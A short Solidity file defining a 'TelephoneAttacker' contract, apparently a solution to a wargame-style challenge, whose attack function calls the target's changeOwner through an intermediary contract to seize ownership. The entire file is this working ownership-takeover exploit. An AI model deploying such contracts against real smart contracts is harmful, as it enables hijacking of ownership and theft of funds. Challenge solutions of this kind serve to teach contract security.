pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
  address telephoneAddress;

  constructor(address _address) public {
    telephoneAddress = _address;
  }

  function attack() public {
    ITelephone(telephoneAddress).changeOwner(msg.sender);
  }

}
